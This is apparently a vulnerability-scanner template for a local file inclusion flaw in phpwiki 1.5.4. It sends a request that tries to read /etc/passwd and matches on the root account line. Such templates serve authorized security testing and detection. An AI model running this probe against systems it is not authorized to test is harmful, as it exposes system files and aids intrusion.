id: phpwiki-lfi
info:
  author: 0x_Akoko
  name: phpwiki 1.5.4 - XSS / Local File Inclusion
  reference: https://www.exploit-db.com/exploits/38027
  severity: high
  tags: phpwiki,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/phpwiki/index.php/passwd'
